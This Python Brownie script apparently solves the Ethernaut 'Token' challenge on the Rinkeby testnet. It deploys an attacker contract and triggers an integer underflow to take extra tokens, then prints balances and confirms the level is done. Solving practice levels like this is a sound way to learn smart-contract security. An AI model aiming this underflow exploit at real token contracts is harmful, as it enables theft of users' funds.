from brownie import accounts, Token, TokenAttacker

# load account
account = accounts.load("Rinkeby_Test_Net_Account")
# get instance
instance_address = "0xF4b2D87f6483806cF4044FFF650e5f8c1EbE3a46"
token = Token.at(instance_address)

# ------------------------------------------------------------------------
# The goal of this level is for you to hack the basic token contract below.
# You are given 20 tokens to start with and you will beat the level
# if you somehow manage to get your hands on any additional tokens.
# Preferably a very large amount of tokens.
# ------------------------------------------------------------------------


def level_completed():
    return token.balanceOf(account.address) > 20


def exploit():
    # deploy hacker contract
    hacker = TokenAttacker.deploy(instance_address, {"from": account})

    # check our balance of tokens
    print(f"Our balance of tokens before exploit: {token.balanceOf(account.address)}")

    # we can cause an interger underflow with our hacker contract
    tx = hacker.attack(
        account.address,
        1000,
        {"from": account, "gas_limit": 1e6, "allow_revert": True},
    )
    tx.wait(1)

    # check our balance again
    print(f"Our balance of tokens after exploit: {token.balanceOf(account.address)}")

    # check our hacker contract balance
    print(f"Hacker contract balance: {token.balanceOf(hacker.address)}")

    # transfer half of our hacker contract balance to ourselves (this is extra)
    # hacker_balance = int(token.balanceOf(hacker.address) / 2)
    # tx = hacker.attack(
    #     account.address,
    #     hacker_balance,
    #     {"from": account, "gas_limit": 1e6, "allow_revert": True},
    # )
    # tx.wait(1)

    # # check our final balance (again, this is overkill)
    # print(f"Our final token balance: {token.balanceOf(account.address)}")

    # confirm we have completed the level
    print(f"Level has been completed: {level_completed()}")


def main():
    exploit()
